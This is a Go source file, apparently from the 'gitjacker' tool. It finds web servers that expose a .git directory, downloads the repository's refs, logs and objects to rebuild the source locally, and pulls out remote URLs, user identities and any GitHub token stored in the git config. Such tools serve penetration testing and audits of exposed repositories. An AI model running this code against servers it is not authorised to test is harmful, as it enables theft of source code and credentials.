package gitjacker

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/sirupsen/logrus"
)

var paths = []string{
	"refs/heads/master",
	"objects/info/packs",
	"description",
	"COMMIT_EDITMSG",
	"index",
	"packed-refs",
	"refs/stash",
	"logs/HEAD",
	"logs/refs/heads/master",
	"logs/refs/remotes/origin/HEAD",
	"info/refs",
	"info/exclude",
	"packed-refs",
}

var ErrNotVulnerable = fmt.Errorf("no .git directory is available at this URL")

type retriever struct {
	baseURL    *url.URL
	outputDir  string
	http       *http.Client
	downloaded map[string]bool
	summary    Summary
}

type Status uint

const (
	StatusUnknown Status = iota
	StatusFailure
	StatusPartialSuccess
	StatusSuccess
)

type Summary struct {
	PackInformationAvailable bool
	FoundObjects             []string
	MissingObjects           []string
	Status                   Status
	OutputDirectory          string
	Config                   Config
}

type Config struct {
	RepositoryName string
	Remotes        []Remote
	Branches       []Branch
	User           User
	GithubToken    GithubToken
}

type User struct {
	Name     string
	Email    string
	Username string
}

type GithubToken struct {
	Username string
	Token    string
}

type Remote struct {
	Name string
	URL  string
}

type Branch struct {
	Name   string
	Remote string
}

func New(target *url.URL, outputDir string) *retriever {

	relative, _ := url.Parse(".git/")
	target = target.ResolveReference(relative)

	return &retriever{
		baseURL:   target,
		outputDir: outputDir,
		http: &http.Client{
			Timeout: time.Second * 10,
		},
		downloaded: make(map[string]bool),
		summary: Summary{
			OutputDirectory: outputDir,
		},
	}
}

func (r *retriever) checkVulnerable() error {
	head, err := r.downloadFile("HEAD")
	if err != nil {
		return fmt.Errorf("%w: %s", ErrNotVulnerable, err)
	}

	if !strings.HasPrefix(string(head), "ref: ") {
		return ErrNotVulnerable
	}

	return nil
}

func (r *retriever) downloadFile(path string) ([]byte, error) {

	path = strings.TrimSpace(path)

	filePath := filepath.Join(r.outputDir, ".git", path)

	if r.downloaded[path] {
		return ioutil.ReadFile(filePath)
	}
	r.downloaded[path] = true

	relative, err := url.Parse(path)
	if err != nil {
		return nil, err
	}

	absolute := r.baseURL.ResolveReference(relative)
	resp, err := r.http.Get(absolute.String())
	if err != nil {
		return nil, fmt.Errorf("failed to retrieve %s: %w", absolute.String(), err)
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status code for url %s : %d", absolute.String(), resp.StatusCode)
	}

	content, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if err := os.MkdirAll(filepath.Dir(filePath), 0755); err != nil {
		return nil, err
	}

	if err := ioutil.WriteFile(filePath, content, 0640); err != nil {
		return nil, fmt.Errorf("failed to write %s: %w", filePath, err)
	}

	if path == "HEAD" {
		ref := strings.TrimPrefix(string(content), "ref: ")
		if _, err := r.downloadFile(ref); err != nil {
			return nil, err
		}
		return content, nil
	}

	if path == "config" {
		return content, r.analyseConfig(content)
	}

	if strings.HasPrefix(path, "refs/heads/") {
		if _, err := r.downloadObject(string(content)); err != nil {
			return nil, err
		}
		return content, nil
	}

	hash := filepath.Base(filepath.Dir(path)) + filepath.Base(path)

	objectType, err := r.getObjectType(hash)
	if err != nil {
		return nil, err
	}

	switch objectType {
	case GitCommitFile:

		commit, err := r.readCommit(hash)
		if err != nil {
			return nil, err
		}

		logrus.Debugf("Successfully retrieved commit %s.", hash)

		if commit.Tree != "" {
			if _, err := r.downloadObject(commit.Tree); err != nil {
				logrus.Debugf("Object %s is missing and likely packed.", commit.Tree)
			}
		}
		for _, parent := range commit.Parents {
			if _, err := r.downloadObject(parent); err != nil {
				logrus.Debugf("Object %s is missing and likely packed.", parent)
			}
		}

	case GitTreeFile:

		tree, err := r.readTree(hash)
		if err != nil {
			return nil, err
		}

		logrus.Debugf("Successfully retrieved tree %s.", hash)

		for _, subHash := range tree.Objects {
			if _, err := r.downloadObject(subHash); err != nil {
				logrus.Debugf("Object %s is missing and likely packed.", subHash)
			}
		}
	case GitBlobFile:
		logrus.Debugf("Successfully retrieved blob %s.", hash)
	default:
		return nil, fmt.Errorf("unknown git file type for %s: %s", path, objectType)
	}

	return content, nil
}

func (r *retriever) downloadObject(hash string) (string, error) {

	logrus.Debugf("Requesting hash [%s]\n", hash)

	path := fmt.Sprintf("objects/%s/%s", hash[:2], hash[2:40])
	if _, err := r.downloadFile(path); err != nil {
		r.summary.MissingObjects = append(r.summary.MissingObjects, hash)
		return "", err
	}
	r.summary.FoundObjects = append(r.summary.FoundObjects, hash)
	return path, nil
}

type GitFileType string

const (
	GitUnknownFile GitFileType = ""
	GitCommitFile  GitFileType = "commit"
	GitTreeFile    GitFileType = "tree"
	GitBlobFile    GitFileType = "blob"
)

func (r *retriever) getObjectType(hash string) (GitFileType, error) {
	cmd := exec.Command("git", "cat-file", "-t", hash)
	cmd.Dir = r.outputDir
	output, err := cmd.Output()
	if err != nil {
		return GitUnknownFile, fmt.Errorf("failed to read type of %s: %w", hash, err)
	}
	return GitFileType(strings.TrimSpace(string(output))), nil
}

type Commit struct {
	Tree    string
	Parents []string
}

func (r *retriever) readCommit(hash string) (*Commit, error) {
	cmd := exec.Command("git", "cat-file", "-p", hash)
	cmd.Dir = r.outputDir
	output, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("failed to read commit %s: %w", hash, err)
	}

	lines := strings.Split(string(output), "\n")
	var commit Commit
	for _, line := range lines {
		line = strings.TrimSpace(line)
		words := strings.Split(line, " ")
		if len(words) <= 1 {
			continue
		}
		switch words[0] {
		case "tree":
			commit.Tree = words[len(words)-1]
		case "parent":
			commit.Parents = append(commit.Parents, words[len(words)-1])
		}
	}
	return &commit, nil
}

type Tree struct {
	Objects []string
}

func (r *retriever) readTree(hash string) (*Tree, error) {

	cmd := exec.Command("git", "cat-file", "-p", hash)
	cmd.Dir = r.outputDir

	output, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("failed to read tree %s: %w", hash, err)
	}

	lines := strings.Split(string(output), "\n")
	var tree Tree
	for _, line := range lines {
		line = strings.TrimSpace(line)
		line = strings.ReplaceAll(line, "\t", " ")
		words := strings.Split(line, " ")
		if len(words) < 4 {
			continue
		}
		tree.Objects = append(tree.Objects, words[2])
	}
	return &tree, nil
}

func (r *retriever) reset() error {

	cmd := exec.Command("git", "reset")
	cmd.Dir = r.outputDir
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to reset files: %w", err)
	}

	return nil
}

func (r *retriever) checkout() error {
	checkoutCmd := exec.Command("git", "checkout", "--", ".")
	checkoutCmd.Dir = r.outputDir
	if err := checkoutCmd.Run(); err != nil {
		return fmt.Errorf("failed to checkout files: %w", err)
	}

	return nil
}

var ErrNoPackInfo = fmt.Errorf("pack information (.git/objects/info/packs) is missing")

func (r *retriever) handlePackFiles() error {
	if _, err := r.downloadFile("objects/info/packs"); err != nil {
		return ErrNoPackInfo
	}

	// TODO retrieve and unpack pack files...
	// anything discovered should be removed from r.summary.MissingObjects and added to r.summary.FoundObjects

	return fmt.Errorf("unpacking pack files is not currently supported")
}

func (r *retriever) Run() (*Summary, error) {

	if err := r.checkVulnerable(); err != nil {
		return nil, err
	}

	if _, err := r.downloadFile("config"); err != nil {
		return nil, err
	}

	if _, err := r.downloadFile("HEAD"); err != nil {
		return nil, err
	}

	// common paths to check, not necessarily required
	for _, path := range paths {
		_, _ = r.downloadFile(path)
	}

	// grab packed files
	if err := r.handlePackFiles(); err == ErrNoPackInfo {
		r.summary.PackInformationAvailable = false
		logrus.Debugf("Pack information file is not available - some objects may be missing.")
	} else if err == nil {
		r.summary.PackInformationAvailable = true
	} else { // if there's a different error, ignore it, we can continue without unpacking
		r.summary.PackInformationAvailable = true
		logrus.Debugf("Error in unpack operation: %s", err)
	}
	if len(r.summary.FoundObjects) == 0 {
		r.summary.Status = StatusFailure
	} else if len(r.summary.MissingObjects) > 0 {
		r.summary.Status = StatusPartialSuccess
	} else {
		r.summary.Status = StatusSuccess
	}

	if err := r.reset(); err != nil {
		if r.summary.Status > StatusPartialSuccess {
			r.summary.Status = StatusPartialSuccess
		}
		logrus.Debugf("Failed to reset: %s", err)
	} else if err := r.checkout(); err != nil {
		if r.summary.Status > StatusPartialSuccess {
			r.summary.Status = StatusPartialSuccess
		}
		logrus.Debugf("Failed to checkout: %s", err)
	}

	return &r.summary, nil
}

func (r *retriever) analyseConfig(content []byte) error {
	lines := strings.Split(string(content), "\n")
	var section string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "[") {
			line = line[1:]
			line = line[0 : len(line)-1]
			args := strings.Split(line, " ")
			section = args[0]
			switch section {
			case "remote":
				name := "?"
				if len(args) > 1 {
					name = strings.TrimSuffix(args[1][1:], "\"")
				}
				r.summary.Config.Remotes = append(r.summary.Config.Remotes, Remote{
					Name: name,
				})
			case "branch":
				name := "?"
				if len(args) > 1 {
					name = strings.TrimSuffix(args[1][1:], "\"")
				}
				r.summary.Config.Branches = append(r.summary.Config.Branches, Branch{
					Name: name,
				})
			}
			continue
		}

		parts := strings.Split(line, "=")
		if len(parts) <= 1 {
			continue
		}

		key := strings.TrimSpace(parts[0])
		val := strings.TrimSpace(strings.Join(parts[1:], "="))

		switch section {
		case "remote":
			switch key {
			case "url":
				r.summary.Config.Remotes[len(r.summary.Config.Remotes)-1].URL = val
				if strings.Contains(val, "/") {
					name := val[strings.Index(val, "/")+1:]
					r.summary.Config.RepositoryName = strings.TrimSuffix(name, ".git")
				}
			}
		case "branch":
			switch key {
			case "remote":
				r.summary.Config.Branches[len(r.summary.Config.Branches)-1].Remote = val
			}
		case "user":
			switch key {
			case "name":
				r.summary.Config.User.Name = val
			case "username":
				r.summary.Config.User.Username = val
			case "email":
				r.summary.Config.User.Email = val
			}
		case "github":
			switch key {
			case "user":
				r.summary.Config.GithubToken.Username = val
			case "token":
				r.summary.Config.GithubToken.Token = val
			}
		}

	}
	return nil
}
